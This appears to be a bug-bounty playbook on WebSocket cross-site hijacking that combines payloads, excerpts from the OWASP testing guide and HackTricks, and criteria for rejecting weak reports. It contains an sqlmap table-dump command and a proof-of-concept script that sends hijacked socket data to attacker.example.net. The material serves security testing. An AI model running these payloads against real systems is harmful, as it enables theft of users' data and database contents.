# Real-World Playbook — WebSocket / CSWSH

**Class:** `websocket-cswsh` · **Coverage-matrix tier:** 1 · **Hunter2:** /websocket · tools/websocket_scanner.py · **Skill:** client-side-security
**Sources:** [reddelexc/hackerone-reports](https://github.com/reddelexc/hackerone-reports) (disclosed reports) · [Az0x7/vulnerability-Checklist](https://github.com/Az0x7/vulnerability-Checklist) (test flow) · [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) + [payloadbox](https://github.com/payloadbox) (payloads) · [OWASP WSTG](https://github.com/OWASP/wstg) + [HowToHunt](https://github.com/KathanP19/HowToHunt) + [AllAboutBugBounty](https://github.com/daffainfo/AllAboutBugBounty) + [HackTricks](https://github.com/HackTricks-wiki/hacktricks) (method)

## Real payloads
*(actual attack strings — adapt to the injection context; fire only where a real sink exists)*

### PayloadsAllTheThings
```
GET /chat HTTP/1.1
Host: example.com:80
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
```
```
HTTP/1.1 101 Switching Protocols
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
```
```
pip install wsrepl
wsrepl -u URL -P auth_plugin.py
```
```
from wsrepl import Plugin
from wsrepl.WSMessage import WSMessage

import json
import requests

class Demo(Plugin):
    def init(self):
        token = requests.get("https://example.com/uuid").json()["uuid"]
        self.messages = [
            json.dumps({
                "auth": "session",
                "sessionId": token
            })
        ]

    async def on_message_sent(self, message: WSMessage) -> None:
        original = message.msg
        message.msg = json.dumps({
            "type": "message",
            "data": {
                "text": original
            }
        })
        message.short = original
        message.long = message.msg

    async def on_message_received(self, message: WSMessage) -> None:
        original = message.msg
        try:
            message.short = json.loads(original)["data"]["text"]
        except:
            message.short = "Error: could not parse message"

        message.long = original
```
```
python ws-harness.py -u "ws://dvws.local:8080/authenticate-user" -m ./message.txt
```
```
{
    "auth_user":"dGVzda==",
    "auth_pass":"[FUZZ]"
}
```
```
sqlmap -u http://127.0.0.1:8000/?fuzz=test --tables --tamper=base64encode --dump
```
```
<script>
  ws = new WebSocket('wss://vulnerable.example.com/messages');
  ws.onopen = function start(event) {
    ws.send("HELLO");
  }
  ws.onmessage = function handleReply(event) {
    fetch('https://attacker.example.net/?'+event.data, {mode: 'no-cors'});
```

## Real attacker flow / methodology
*(how real hunters approach this class step by step)*

### From OWASP WSTG (testing guide)
### WebSockets

|ID          |
|------------|
|WSTG-CLNT-10|

#### Summary

Traditionally, the HTTP protocol only allows one request/response per TCP connection. Asynchronous JavaScript and XML (AJAX) allows clients to send and receive data asynchronously (in the background without a page refresh) to the server, however, AJAX requires the client to initiate the requests and wait for the server responses (half-duplex).

[WebSockets](https://html.spec.whatwg.org/multipage/web-sockets.html#network) allow the client or server to create a 'full-duplex' (two-way) communication channel, allowing the client and server to truly communicate asynchronously. WebSockets conduct their initial *upgrade* handshake over HTTP and from then on all communication is carried out over TCP channels by use of frames. For more, see the [WebSocket Protocol](https://tools.ietf.org/html/rfc6455).

##### Origin

It is the server’s responsibility to verify the [`Origin` header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin) in the initial HTTP WebSocket handshake. If the server does not validate the origin header in the initial WebSocket handshake, the WebSocket server may accept connections from any origin. This could allow attackers to communicate with the WebSocket server cross-domain allowing for CSRF-like issues. See also [A01:2025 Broken Access Control](https://owasp.org/Top10/2025/A01_2025-Broken_Access_Control/). The exploit for this weakness is called Cross-Site Websocket Hijacking (CSWH or CSWSH).

##### Confidentiality and Integrity

WebSockets can be used over unencrypted TCP or over encrypted TLS. To use unencrypted WebSockets the `ws://` URI scheme is used (default port 80), to use encrypted (TLS) WebSockets the `wss://` URI scheme is used (default port 443). See also [A04:2025 Cryptographic Failures](https://owasp.org/Top10/2025/A04_2025-Cryptographic_Failures/).

##### Input Sanitization

As with any data originating from untrusted sources, the data should be properly sanitized and encoded. See also [A05:2025 Injection](https://owasp.org/Top10/2025/A05_2025-Injection/) (includes XSS).

#### Test Objectives

- Identify the usage of WebSockets.
- Assess its implementation by using the same tests on normal HTTP channels.

#### How to Test

##### Black-Box Testing

1. Identify that the application is using WebSockets.
   - Inspect the client-side source code for the `ws://` or `wss://` URI scheme.
   - Use Google Chrome's Developer Tools to view the Network WebSocket communication.
   - Use [ZAP's](https://www.zaproxy.org) WebSocket tab.
2. Origin.
   - Using a WebSocket client (one can be found in the Tools section below) attempt to connect to the remote WebSocket server. If a connection is established the server may not be checking the origin header of the WebSocket handshake.
3. Confidentiality and Integrity.
   - Check that the WebSocket connection is using TLS to transport sensitive information `wss://`.
   - Check the HTTPS Implementation for security issues (Valid Certificate, BEAST, CRIME, RC4, etc). Refer to the [Weak Transport Layer Security](../09-Weak_Cryptography/01-Weak_Transport_Layer_Security.md) section of this guide.
4. Authentication.
   - WebSockets do not handle authentication, normal black-box authentication tests should be carried out. Refer to the [Authentication Testing](../04-Authentication/README.md) sections of this guide.
5. Authorization.
   - WebSockets do not handle authorization, normal black-box authorization tests should be carried out. Refer to the [Authorization Testing](../05-Authorization/README.md) sections of this guide.
6. Input Sanitization.
   - Use [ZAP's](https://www.zaproxy.org) WebSocket tab to replay and fuzz WebSocket requests and responses. Refer to the [Injection Testing](../07-Injection/README.md) section of this guide.

###### Example 1

Once we have identified that the application is using WebSockets (as described above) we can use the [Zed Attack Proxy (ZAP)](https://www.zaproxy.org) to intercept the WebSocket request and responses. ZAP can then be used to replay and fuzz the WebSocket request/responses.

*Figure 4.11.10-1: ZAP WebSockets*

###### Example 2

Using a WebSocket client (one can be found in the Tools section below) attempt to connect to the remote WebSocket server. If the connection is allowed the WebSocket server may not be checking the WebSocket handshake's origin header. Attempt to replay requests previously intercepted to verify that cross-domain WebSocket communication is possible.

*Figure 4.11.10-2: WebSocket Client*

*(truncated — open the source link for the full method)*

### From HackTricks (excerpt — see [HackTricks](https://github.com/HackTricks-wiki/hacktricks) for full)
### WebSocket Attacks


#### What are WebSockets

WebSocket connections are established through an initial **HTTP** handshake and are designed to be **long-lived**, allowing for bidirectional messaging at any time without the need for a transactional system. This makes WebSockets particularly advantageous for applications requiring **low latency or server-initiated communication**, such as live financial data streams.

##### Establishment of WebSocket Connections

A detailed explanation on establishing WebSocket connections can be accessed [**here**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc). In summary, WebSocket connections are usually initiated via client-side JavaScript as shown below:<sup>[[20]](#references)</sup>

```javascript
var ws = new WebSocket("wss://normal-website.com/ws")
```

The `wss` protocol signifies a WebSocket connection secured with **TLS**, whereas `ws` indicates an **unsecured** connection.

During the connection establishment, a handshake is performed between the browser and server over HTTP. The handshake process involves the browser sending a request and the server responding, as illustrated in the following examples:

Browser sends a handshake request:

```javascript

*(truncated — open the source link for the full method)*

## Chaining — always ask "what does this unlock?"
- No Origin check on WS handshake → hijack authed socket → data/actions
- Injection over WS messages

## Hunter2 wiring
- **Run:** `/websocket · tools/websocket_scanner.py`
- **Skill:** `client-side-security`
- **Coverage-matrix tier:** 1 (Tier 0 = test first)

## What gets this rejected (kill before you write)
*(from the toolkit NEVER-SUBMIT list — match one of these with no chain → KILL IT)*
- WS handshake accepts a cross-origin `Origin` but the socket carries no auth/session and no sensitive action
- No missing Origin/CSRF check actually proven — connection works but returns only public data
- "No Origin validation" where the app uses per-message tokens the attacker page cannot read
- Injection over WS messages that only affects your own session/data
- Unencrypted `ws://` or missing-header observation alone (best-practice, not impact)

**Conditionally valid (only WITH a chain):** no Origin check on an authenticated WS handshake → hijack the victim's socket → read their data or perform sensitive actions (CSWSH).
